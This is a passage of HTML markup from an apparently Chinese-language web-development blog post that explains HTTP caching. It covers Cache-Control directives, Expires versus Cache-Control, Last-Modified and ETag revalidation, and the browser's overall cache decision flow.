CDN 的内容，浏览器也不会进行请求。max-age 用于普通缓存，而 s-maxage 用于代理缓存。s-maxage 的优先级高于 max-age。如果存在 s-maxage，则会覆盖掉 max-age 和 Expires header。</p>\n<h4 id="max-stale"><a href="#max-stale" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>max-stale</h4>\n<p>能容忍的最大过期时间。max-stale 指令标示了客户端愿意接收一个已经过期了的响应。如果指定了 max-stale 的值，则最大容忍时间为对应的秒数。如果没有指定，那么说明浏览器愿意接收任何 age 的响应（age 表示响应由源站生成或确认的时间与当前时间的差值）。</p>\n<h4 id="min-fresh"><a href="#min-fresh" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>min-fresh</h4>\n<p>能够容忍的最小新鲜度。min-fresh 标示了客户端不愿意接受新鲜度不多于当前的 age 加上 min-fresh 设定的时间之和的响应。</p>\n<h4 id="must-revalidate"><a href="#must-revalidate" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>must-revalidate</h4>\n<p>must-revalidate 告诉缓存，在事先没有跟原始服务器进行再验证的情况下，不能提供这个对象的陈旧副本，缓存仍然可以随意提供新鲜的副本。如果在缓存进行 must-revalidate 新鲜度检查时，原始服务器不可用，缓存就必须返回一条 504 错误。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-00-28-46-7d005dd2ac431bf1172691fb994c4a0c-8f041.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 90.1219512195122%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAAsSAAALEgHS3X78AAACZ0lEQVQ4y41UDW/aMBDN//8VlaZV2ia1m1TWdV07aLuVQhrIKIUSQiABkkDsJHa+bCfODKyFSm21p1N08vnl7t1dIpU7yDLS7Hm11vyo2r1UXbkPkjQV55yXL0LiIrKxsqSUtQfg7Mb4cPS7KlttDWaEiPOC88crz8lPHokjBEAQCgR5nqMwgHC5gNPydUhx6CF7BKba6K7hDP8kOFjXucoymXv1tlZXBl3N7o0WxgwURf6MDKcPeFAzGhVTOYn0q9Adr+rMV5dqN4P3R639irJ3cP3ptFe9NXPGnl69ItMsjZEvEgqLEGSMbgKcpAjHk6kjzJq5hmkvPT8lsdD+guZ/HFEYLxilYGr6nrtTJ0/TdDjRPd9neUHzghWFtGk1LwoR9yD+pToXinV80Tu+6te7YOZAIkqLE0IY8gE2VUut6soZMmTf6q3J5XoUJQcQ/ZTNgxPl8w/1Y6VeU2ZjyxFcjHGcJJ479/Xm4uFavz2DWh2aXWmjIOdlCCF03TiOKMnynDIqZodd4EIEt6J2HGESGHew2dZuz63OJTRaSYSf+hl6Nhg2dOXc7FyhSStwjHVTxMoUG7ESGCl4LOvyqdO9QBMlibdk5NnRuGm2z6edmnD8+XB3TutRsTwjlBDqAbBYLNMk2nSYcxbH2HFdPwgpYykRDeavrqdAkpL+yG53R9fyvXj2dTvN6FvruRFf8NWo5oug8nu2/1XdO2y8+yIfVo2ZGz6Wyl8kb8FYvoQYhIlhOV4QL2EkvrO3M28hVhfZGp73rPubwLyLHE2s2v+SCcnAsGkq39XqoSF/g3ozS5Py9b/BX/vl9/bhbUI6AAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 20 00 28 46" title="" data-src="/static/2021-07-20-00-28-46-7d005dd2ac431bf1172691fb994c4a0c-fee1c.png" data-srcset="/static/2021-07-20-00-28-46-7d005dd2ac431bf1172691fb994c4a0c-a67b7.png 200w,\n/static/2021-07-20-00-28-46-7d005dd2ac431bf1172691fb994c4a0c-0b187.png 400w,\n/static/2021-07-20-00-28-46-7d005dd2ac431bf1172691fb994c4a0c-fee1c.png 800w,\n/static/2021-07-20-00-28-46-7d005dd2ac431bf1172691fb994c4a0c-8f041.png 820w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>从图中我们可以看到，我们可以将多个指令配合起来一起使用，达到多个目的。比如说我们希望资源能被缓存下来，并且是客户端和代理服务器都能缓存，还能设置缓存失效时间等等。</p>\n<h3 id="expires-和-cache-control-两者对比"><a href="#expires-%E5%92%8C-cache-control-%E4%B8%A4%E8%80%85%E5%AF%B9%E6%AF%94" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Expires 和 Cache-Control 两者对比</h3>\n<p>其实这两者差别不大，区别就在于 Expires 是 http1.0 的产物，Cache-Control 是 http1.1 的产物，两者同时存在的话，Cache-Control 优先级高于 Expires；在某些不支持 HTTP1.1 的环境下，Expires 就会发挥用处。所以 Expires 其实是过时的产物，现阶段它的存在只是一种兼容性的写法。</p>\n<p>强缓存判断是否缓存的依据来自于是否超出某个时间或者某个时间段，而不关心服务器端文件是否已经更新，这可能会导致加载文件不是服务器端最新的内容，那我们如何获知服务器端内容是否已经发生了更新呢？此时我们需要用到协商缓存策略。</p>\n<h2 id="协商缓存"><a href="#%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>协商缓存</h2>\n<p>协商缓存就是强制缓存失效后，浏览器携带缓存标识向服务器发起请求，由服务器根据缓存标识决定是否使用缓存的过程，主要有以下两种情况：</p>\n<ul>\n<li>\n<p>协商缓存生效，返回 304 和 Not Modified</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-00-33-21-ec16b2d6c31f6e7f4b6f75c5af613dee-e31b0.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 709px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 76.0225669957687%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsSAAALEgHS3X78AAABw0lEQVQoz1WS166CYBCEef938sIYo7HEHo2iYAkoqOCxI+V87mKbi81fdna2GVEUWZZVLpdHo9H5fI7j+H6/p2kaBEGlUikUCt1u93q98sIX9nQ61Wq1arXqeZ7xeDzwcxwHy3eWZXhgb7fbarVaLpfb7RaBJEmUTGhHQBRDCbvdjrvrus1mk8DY9Xo9nU6PxyO/iQDPJE40BWU9yXyEYQifYNitANpms6GQnPay4Cbg8FFuNBr9fn8wGCA4mUwotdfr+b6PFKXhphYOVWhfDK0EZQhaDATf812Bpq1dUIs/6WgXcmVaB20jmM/n9LlUKhWLxeoLNGIlYDSmaWr/c2UU0PsTHA4HX0Dl+92el72AA03hQEY/aTMnNEk+EOBHF9AZDofj8ZhwRMfyrjJE+ZB51d5eBTSTQJBnsxlVoKZxsZoXnlma5WR0eKKYmqBer9uWzYagoHPGR602n7TzhnGnPNu2F4uFKWBaXJElo+dCPOLvUcH8mbPWDK3VanU6nXa77QkoQcejS/J9yDeMMigMqVBAIF4oZCnQnX9vWHSP3PVzBS6Xi8G40WSZaA/JvJeBFrBtrB2DfZP5gsMisn9E/wc980c4X7GHnAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 20 00 33 21" title="" data-src="/static/2021-07-20-00-33-21-ec16b2d6c31f6e7f4b6f75c5af613dee-e31b0.png" data-srcset="/static/2021-07-20-00-33-21-ec16b2d6c31f6e7f4b6f75c5af613dee-ae213.png 200w,\n/static/2021-07-20-00-33-21-ec16b2d6c31f6e7f4b6f75c5af613dee-0d4a3.png 400w,\n/static/2021-07-20-00-33-21-ec16b2d6c31f6e7f4b6f75c5af613dee-e31b0.png 709w" data-sizes="(max-width: 709px) 100vw, 709px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n</li>\n<li>\n<p>协商缓存失效，返回 200 和请求结果</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-00-34-10-565afaf4d2425007918a194c41523e9a-4c169.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 666px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 77.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsSAAALEgHS3X78AAAB10lEQVQoz22TyXLCMBBE/f//Ew5QRbjEBQcO7KvZd7PbLN7zrHFEqGSqELKknu7pkYzNZtNqtcbjseu6URQFQRCGoed5g8GgXq+32+3j8RipYD2OY9u2Oc/u4/Ew9vv9cDgkBYAkSdhm5Oh0Ou10OqPR6HK5/AaTq9/vQ/Z8Pg1W+V4sFrvdjiwAYFuv12xvt1vB6FEm0IAkkQHP6XQ6HA6O40wmE8uySHw+n1erFeniKA5T3AvJ6KlIwfyoFh7YKIFEIKliuVxSXvgeOALY9/0MDDOyK5VKo94goIUf8d1uF3zyJ0Q2+AwMVcqztyV6vR5lYym5uiqYz2Yz5KCO1Jx5gWGmPMaDCmzjtPTJUoEcYEcV8/kcI9Gf1Xy73cBIhxn5pD3k5iiiMBJvZZdgfr/fX8wg6SrKcRiGWq1mmmaz2cSIcrlcrVaRoGUz0tfMMNwjmVyvWIX2RrTJnIluta8iAyPser3qUQIhtC1QIYL/6TNZkZTP54vFYqFQKH2WzC+Tee4jh3PSm+gn3sBRbPCHZjwIwkC25QT+w+x7vl6XUW6+3PP0YeAHDQAvhaV3znGxULqF+bKuXxWO0vz0YWAgt4LWw6/B1Mx74p6xpddlC0VkZB2ybyMPgJSclse0AAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 20 00 34 10" title="" data-src="/static/2021-07-20-00-34-10-565afaf4d2425007918a194c41523e9a-4c169.png" data-srcset="/static/2021-07-20-00-34-10-565afaf4d2425007918a194c41523e9a-76d25.png 200w,\n/static/2021-07-20-00-34-10-565afaf4d2425007918a194c41523e9a-edf88.png 400w,\n/static/2021-07-20-00-34-10-565afaf4d2425007918a194c41523e9a-4c169.png 666w" data-sizes="(max-width: 666px) 100vw, 666px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n</li>\n</ul>\n<p>协商缓存可以通过设置两种 HTTP Header 实现：Last-Modified 和 ETag。</p>\n<h3 id="last-modified-和-if-modified-since"><a href="#last-modified-%E5%92%8C-if-modified-since" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Last-Modified 和 If-Modified-Since</h3>\n<p>浏览器在第一次访问资源时，服务器返回资源的同时，在 response header 中添加 Last-Modified 的 header，值是这个资源在服务器上的最后修改时间，浏览器接收缓存文件和 header；</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="57211951346931780000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`Last-Modified: Fri, 22 Jul 2016 01:47:00 GMT`, `57211951346931780000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title=""\n              >\n                \n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">Last-Modified: Fri, 22 Jul 2016 01:47:00 GMT</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>浏览器下一次请求这个资源，浏览器检测到有 Last-Modified 这个 header，于是添加 If-Modified-Since 这个 header，值就是 Last-Modified 中的值；</p>\n<p>服务器再次收到这个资源请求，会根据 If-Modified-Since 中的值与服务器中这个资源的最后修改时间对比，如果没有变化，返回 304 和空的响应体，直接从缓存读取，如果 If-Modified-Since 的时间小于服务器中这个资源的最后修改时间，说明文件有更新，于是返回新的资源文件和 200</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-00-40-45-069aa31ef6e6e54316defe91ad8dc248-5032e.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 438px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 86.7579908675799%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAIAAABSJhvpAAAACXBIWXMAAAsSAAALEgHS3X78AAAB1UlEQVQ4y32Su07DQBBF/TV8A4EvoCItHaKCP0A8UlGYEFEgkCigJBIFKShokQgKtFAQCSnvd+LIiY3ttb3r5WYHrAAhV8pqsrt358yMNdt1u65rMi8SXAjB+WSdoyiKxuOxbdtRJDUxsqzLc3b/yKWcWP83h2Eopczn84fp9OnZ2WOhoN1e68crGy8361K8cSE5D+ebr7LZVSiZ3N7Z1VL3Bwsnmy/mmpSvIZ9nDoIA5qNMZjGRWFpe3ttPaUPHunu/4MGDEFKV/IXNp4qkXpA5l8ttbm3pul54etZwKiNJTnUzIkL+LXjwl14hSSVsaDhmgSeEj2PP8xhjhmH0er16vV6tVtvtdqfTaTabH0q4gIfYRJ7vB9r0eHCMMViWZStR4DiOpTQwDKzITPfx+2GOkSY4jBE2MdN+7JxhHgwGAO52u+VyuVQqNRoNCgDf7/dxBK4ZmbGFDLjaUYLfUIIHL2Kl/X+xY+aYkHamO6yaLH5j49j3fVCNRiOkbbVaaDVAEKDV6LxpmtRFasFvMzpUq9VQYVUJcUOJAviLxSKCOPE87L8i/hnY8ahAhWm7rgsQrBgyVhp4/J3OwMZniK4Oh0OwoU6MB6hEXqlUUAjKxp3pzJ+0n7mB6FRVRAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 20 00 40 45" title="" data-src="/static/2021-07-20-00-40-45-069aa31ef6e6e54316defe91ad8dc248-5032e.png" data-srcset="/static/2021-07-20-00-40-45-069aa31ef6e6e54316defe91ad8dc248-86481.png 200w,\n/static/2021-07-20-00-40-45-069aa31ef6e6e54316defe91ad8dc248-1ca59.png 400w,\n/static/2021-07-20-00-40-45-069aa31ef6e6e54316defe91ad8dc248-5032e.png 438w" data-sizes="(max-width: 438px) 100vw, 438px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>但是 Last-Modified 存在一些弊端：</p>\n<ul>\n<li>如果本地打开缓存文件，即使没有对文件进行修改，但还是会造成 Last-Modified 被修改，服务端不能命中缓存导致发送相同的资源</li>\n<li>因为 Last-Modified 只能以秒计时，如果在不可感知的时间内修改完成文件，那么服务端会认为资源还是命中了，不会返回正确的资源</li>\n</ul>\n<p>既然根据文件修改时间来决定是否缓存尚有不足，能否可以直接根据文件内容是否修改来决定缓存策略？所以在 HTTP/1.1 出现了 ETag 和 If-None-Match</p>\n<h3 id="etag-和-if-none-match"><a href="#etag-%E5%92%8C-if-none-match" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ETag 和 If-None-Match</h3>\n<p>Etag 是服务器响应请求时，返回当前资源文件的一个唯一标识（由服务器生成），只要资源有变化，Etag 就会重新生成。</p>\n<p>浏览器在下一次加载资源向服务器发送请求时，会将上一次返回的 Etag 值放到 request header 里的 If-None-Match 里，服务器只需要比较客户端传来的 If-None-Match 跟自己服务器上该资源的 ETag 是否一致，就能很好地判断资源相对客户端而言是否被修改过了。</p>\n<p>如果服务器发现 ETag 匹配不上，那么直接以常规 GET 200 形式将新的资源（当然也包括了新的 ETag）发给客户端；如果 ETag 是一致的，则直接返回 304 知会客户端直接使用本地缓存即可。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-00-47-46-ce5f8a1b4a68e22c68451e6c4520fab8-94f8a.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 546px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 46.88644688644688%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABCUlEQVQoz22QyW6EMBBE+f/PYzkAYgkYxjZLJGwQ4sDkYU8mJEpJoHa5ql3dgdb66WCMSZKkaZqqquq65l8URVVWff/wUEpFUYTM68dxDP6YoRANwyBBL+d5wiYd4Nu2/WVG5w/ruvLsPM+wdFRSeturkSuyLLPWev00TQHfsix0hS3LEhu6ru+EEK0QRPZZegdiI0Pz6fB6+TzPbdsQ8T69rDGIqPmTkwhsgS74YfZ9P46DjD8zI+WaFvYby2KwwzMqy/sn9n1hcRz7hA83LsEI33Ud5IdDGIbvhV1m7jj7sWkPpfXggVkqrdR1hudIz/fL17aJPjlQ+AnvsDeKEn+e54RP05TtfgGNNvQ79OmZ9AAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 20 00 47 46" title="" data-src="/static/2021-07-20-00-47-46-ce5f8a1b4a68e22c68451e6c4520fab8-94f8a.png" data-srcset="/static/2021-07-20-00-47-46-ce5f8a1b4a68e22c68451e6c4520fab8-e2b97.png 200w,\n/static/2021-07-20-00-47-46-ce5f8a1b4a68e22c68451e6c4520fab8-db056.png 400w,\n/static/2021-07-20-00-47-46-ce5f8a1b4a68e22c68451e6c4520fab8-94f8a.png 546w" data-sizes="(max-width: 546px) 100vw, 546px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<h3 id="etag-和-last-modified-两者对比"><a href="#etag-%E5%92%8C-last-modified-%E4%B8%A4%E8%80%85%E5%AF%B9%E6%AF%94" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Etag 和 Last-Modified 两者对比</h3>\n<ul>\n<li>\n<p>在精确度上，Etag 要优于 Last-Modified。</p>\n<p>Last-Modified 的时间单位是秒，如果某个文件在 1 秒内改变了多次，那么他们的 Last-Modified 其实并没有体现出来修改，但是 Etag 每次都会改变确保了精度；如果是负载均衡的服务器，各个服务器生成的 Last-Modified 也有可能不一致。</p>\n</li>\n<li>\n<p>在性能上，Etag 要逊于 Last-Modified，毕竟 Last-Modified 只需要记录时间，而 Etag 需要服务器通过算法来计算出一个 hash 值。</p>\n</li>\n<li>\n<p>在优先级上，服务器校验优先考虑 Etag</p>\n</li>\n</ul>\n<h1 id="缓存机制"><a href="#%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>缓存机制</h1>\n<p>强制缓存优先于协商缓存进行，若强制缓存(Expires 和 Cache-Control)生效则直接使用缓存，若不生效则进行协商缓存(Last-Modified / If-Modified-Since 和 Etag / If-None-Match)，协商缓存由服务器决定是否使用缓存，若协商缓存失效，那么代表该请求的缓存失效，返回 200，重新返回资源和缓存标识，再存入浏览器缓存中；生效则返回 304，继续使用缓存。具体流程图如下：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-00-56-37-a13ebd29a925d5144033e41bba27bddb-561f5.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 519px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 89.01734104046243%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAAsSAAALEgHS3X78AAAClElEQVQ4yzWU25KbMBBE+f8P2pfsS/YxqSR2rb2+gAN4HRsDNkLiJgQ4R2g9pVIJ0Kinu0d4XdudTqc4jpu6Hp9hdNfVVZ3ndZo2aVrFsQoj9Xlqheh11xvdj8aMxjPGlGV5v93NHIMZCD49Hg8thNrtVRjK1Vq8r2Rw0EoOpjdDb6bBJrOV5CzLxmm0aXPUdVVJqTvd1jUVgcShvJ/GcdB950J3Hpmr1cr3/WuS3G63PMvO5/Nuu1sul4vFYr1aH+P4mlxLIfIsF0XxeTwegsNysUyvV09rXYqyKApwXNl937dNy9ExPMsSUXTbjSAPQ9e2ZSG6pr1lOXu8x/So65pkSM7JlvQ0TTwCyJqF5dObxzT1na6UYiFFCQWvqqowDIMgoP5hjiRJPtbrv4fDfrf19z7jcj73Gq4aWEwYh5EFNVrO/n4f+AGUAAQYFscjTOMsTbebzebjo7jf0Yz36EgmQ5Yls1Wbw4QQiOmQYdG2lnN2TaEHoJJyGsZKKmyarCvPZNBQqGmaJ2dLGBWhAz7lIQy6INv59C9Ls942yCBc2eyLwhCrQHPgnC1LGUXRdrM9BEFyucAojuI/v36v3t+bumEDFCwy3r5+e315eaFJkdEl6zlQu22abvaJmQRVUnlvBXPJNFCSXJBHKeWQmcnkzc8fP+gH2/NWpIHiHWHWX5zZijYwhLMTjB1oRnu9fX9DaiXVaLt9eM7jw/LC58njgbMxA7Rnz9JI3B8RR5HrJGeynbVtPtQ6+EGlKouM2rgtXZTzkBL96Xa2olCtKhzG0QZTC3H6/Nxvd6jouTs4uRjtgBvl5HlObyWXBECExOf5qyVs+Vvy85X8ao45zCwYhts/RBQBAgV7E2e2Tq1xfuS4/+x1/1w8/B4oAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 20 00 56 37" title="" data-src="/static/2021-07-20-00-56-37-a13ebd29a925d5144033e41bba27bddb-561f5.png" data-srcset="/static/2021-07-20-00-56-37-a13ebd29a925d5144033e41bba27bddb-214e0.png 200w,\n/static/2021-07-20-00-56-37-a13ebd29a925d5144033e41bba27bddb-ef58c.png 400w,\n/static/2021-07-20-00-56-37-a13ebd29a925d5144033e41bba27bddb-561f5.png 519w" data-sizes="(max-width: 519px) 100vw, 519px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>看到这里，不知道你是否存在这样一个疑问:如果什么缓存策略都没设置，那么浏览器会怎么处理？</p>\n<p>对于这种情况，浏览器会采用一个启发式的算法，通常会取响应头中的 Date 减去 Last-Modified 值的 10% 作为缓存时间。</p>\n<h1 id="实际场景"><a href="#%E5%AE%9E%E9%99%85%E5%9C%BA%E6%99%AF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 